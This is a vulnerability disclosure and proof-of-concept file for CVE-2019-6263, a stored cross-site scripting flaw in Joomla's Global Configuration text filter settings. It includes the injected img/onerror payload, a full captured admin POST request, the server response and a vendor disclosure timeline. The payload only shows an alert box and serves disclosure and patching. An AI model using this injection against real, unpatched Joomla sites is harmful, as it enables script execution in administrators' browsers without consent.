@@ -1,0 +1,86 @@
+# Exploit Title: [Joomla Global Configuration Text Filter settings Stored XSS Vulnerability]
+# Date: [18/01/2019]
+# Exploit Author: [Praveen Sutar] , Twitter: @praveensutar123
+# Vendor Homepage: [https://www.joomla.org/]
+# Affected Versions: [Joomla versions 2.5.0 through 3.9.1]
+# Tested on: [Joomla 3.9.1]
+# CVE : [CVE-2019-6263]
+# Vendor Advisory: [https://developer.joomla.org/security-centre/762-20190103-core-stored-xss-issue-in-the-global-configuration-textfilter-settings]
+# Author Blog: [http://awesomehackers.org/2019/01/18/cve-2019-6263-joomla-exploit-poc/]
+
+==================
+#Product:-
+==================
+The Flexible Platform Empowering Website Creators. Joomla! is an award-winning content management system (CMS), which enables you to build web sites and powerful online applications.
+
+==================
+#Vulnerability:-
+==================
+Joomla Core - Stored XSS issue in the Global Configuration textfilter settings.
+
+========================
+#Vulnerability Details:-
+========================
+
+=====================================================================================================================================================
+1. Joomla Core - Stored XSS issue in the Global Configuration textfilter settings (CVE-2019-6263)
+=====================================================================================================================================================
+
+Joomla failes to perform adequate checks at the Global Configuration Text Filter settings which allows a stored XSS.
+
+#Proof-Of-Concept:
+------------------
+1. Login to Joomla administrator console
+2. Navigate to System -> Global Configuration -> Text Filters
+3. Add following payload in Filter Tags2 with No HTML (Filter Type) as Public (Filter Group):
+
+	jform[filters][1][filter_tags]=ss"><img+src=+xx+onerror=alert(7575)><
+
+
+==========
+Request :
+==========
+	POST /administrator/index.php?option=com_config HTTP/1.1
+	Host: <target_ip>
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://<target_ip>/administrator/index.php?option=com_config
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 4303
+	Connection: close
+	Cookie: wp-settings-time-1=1540363679; 05e3b315128406acf7dd996046a180f8=__SITE__; 7bb05cf41807f1d0136fbae285e8a16c=1; 783fff54c324d89891f303b51230c499=vnrnl8bo3u62d25ak8tqbruhs2
+	Upgrade-Insecure-Requests: 1
+
+	jform%5Bsitename%5D=testjoomla&jform%5Boffline%5D=0&jform%5Bdisplay_offline_message%5D=1&jform%5Boffline_message%5D=This+site+is+down+for+maintenance.%3Cbr+%2F%3EPlease+check+back+again+soon.&jform%5Boffline_image%5D=&jform%5Bfrontediting%5D=1&jform%5Beditor%5D=tinymce&jform%5Bcaptcha%5D=0&jform%5Baccess%5D=1&jform%5Blist_limit%5D=20&jform%5Bfeed_limit%5D=10&jform%5Bfeed_email%5D=none&jform%5BMetaDesc%5D=adsadsa&jform%5BMetaKeys%5D=&jform%5Brobots%5D=&jform%5BMetaRights%5D=&jform%5BMetaAuthor%5D=1&jform%5BMetaVersion%5D=0&jform%5Bsef%5D=1&jform%5Bsef_rewrite%5D=0&jform%5Bsef_suffix%5D=0&jform%5Bunicodeslugs%5D=0&jform%5Bsitename_pagetitles%5D=0&jform%5Bcookie_domain%5D=&jform%5Bcookie_path%5D=&jform%5Blog_path%5D=%2Fvar%2Fwww%2Fhtml%2Fadministrator%2Flogs&jform%5Bhelpurl%5D=https%3A%2F%2Fhelp.joomla.org%2Fproxy%3Fkeyref%3DHelp%7Bmajor%7D%7Bminor%7D%3A%7Bkeyref%7D%26lang%3D%7Blangcode%7D&jform%5Bdebug%5D=0&jform%5Bdebug_lang%5D=0&jform%5Bdebug_lang_const%5D=1&jform%5Bcache_handler%5D=file&jform%5Bcache_path%5D=&jform%5Bmemcache_persist%5D=1&jform%5Bmemcache_compress%5D=0&jform%5Bmemcache_server_host%5D=localhost&jform%5Bmemcache_server_port%5D=11211&jform%5Bmemcached_persist%5D=1&jform%5Bmemcached_compress%5D=0&jform%5Bmemcached_server_host%5D=localhost&jform%5Bmemcached_server_port%5D=11211&jform%5Bredis_persist%5D=1&jform%5Bredis_server_host%5D=localhost&jform%5Bredis_server_port%5D=6379&jform%5Bredis_server_auth%5D=&jform%5Bredis_server_db%5D=0&jform%5Bcachetime%5D=15&jform%5Bcache_platformprefix%5D=0&jform%5Bcaching%5D=0&jform%5Bsession_handler%5D=database&jform%5Bsession_memcache_server_host%5D=localhost&jform%5Bsession_memcache_server_port%5D=11211&jform%5Bsession_memcached_server_host%5D=localhost&jform%5Bsession_memcached_server_port%5D=11211&jform%5Bsession_redis_persist%5D=1&jform%5Bsession_redis_server_host%5D=localhost&jform%5Bsession_redis_server_port%5D=6379&jform%5Bsession_redis_server_auth%5D=&jform%5Bsession_redis_server_db%5D=0&jform%5Blifetime%5D=15&jform%5Bshared_session%5D=0&jform%5Btmp_path%5D=%2Fvar%2Fwww%2Fhtml%2Ftmp&jform%5Bgzip%5D=0&jform%5Berror_reporting%5D=default&jform%5Bforce_ssl%5D=0&jform%5Boffset%5D=UTC&jform%5Bftp_enable%5D=0&jform%5Bftp_host%5D=&jform%5Bftp_port%5D=&jform%5Bftp_user%5D=&jform%5Bftp_pass%5D=&jform%5Bftp_root%5D=&jform%5Bproxy_enable%5D=0&jform%5Bproxy_host%5D=&jform%5Bproxy_port%5D=&jform%5Bproxy_user%5D=&jform%5Bproxy_pass%5D=&jform%5Bdbtype%5D=mysqli&jform%5Bhost%5D=localhost&jform%5Buser%5D=root&jform%5Bdb%5D=joomla&jform%5Bdbprefix%5D=isadh_&jform%5Bmailonline%5D=1&jform%5Bmassmailoff%5D=0&jform%5Bmailfrom%5D=test%40example.com&jform%5Bfromname%5D=testjoomla&jform%5Breplyto%5D=&jform%5Breplytoname%5D=&jform%5Bmailer%5D=mail&jform%5Bsendmail%5D=%2Fusr%2Fsbin%2Fsendmail&jform%5Bsmtphost%5D=localhost&jform%5Bsmtpport%5D=25&jform%5Bsmtpsecure%5D=none&jform%5Bsmtpauth%5D=0&jform%5Bsmtpuser%5D=&jform%5Bsmtppass%5D=&jform%5Bfilters%5D%5B1%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B1%5D%5Bfilter_tags%5D=ss%22%3E%3Cimg+src%3D+xx+onerror%3Dalert%287575%29%3E%3C&jform%5Bfilters%5D%5B1%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B9%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B6%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B7%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_type%5D=NH&jform%5Bfilters%5D%5B2%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B3%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B4%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B5%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B8%5D%5Bfilter_type%5D=NONE&jform%5Bfilters%5D%5B8%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B8%5D%5Bfilter_attributes%5D=&task=config.save.application.apply&fc4982bad4604f5ea5d8adc003a6034c=1
+
+
+
+4. Save the Changes.
+5. Navigate to Global Configuration page and an alert box will pop up. Here's the response body:
+
+==========
+Response:
+==========
+	HTTP/1.1 303 See other
+	Date: Fri, 18 Jan 2019 07:30:48 GMT
+	Server: Apache/2.4.7 (Ubuntu)
+	X-Powered-By: PHP/5.5.9-1ubuntu4.26
+	Location: /administrator/index.php?option=com_config
+	Expires: Wed, 17 Aug 2005 00:00:00 GMT
+	Last-Modified: Fri, 18 Jan 2019 07:30:48 GMT
+	Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+	Pragma: no-cache
+	Content-Length: 0
+	Connection: close
+	Content-Type: text/html; charset=utf-8
+
+
+===================================
+#Vulnerability Disclosure Timeline:
+===================================
+
+11/2018: First email to disclose the vulnerability to Joomla.
+12/2018: Vendor confirmed vulnerability.
+01/2019: Vendor published advisory and released a fix.
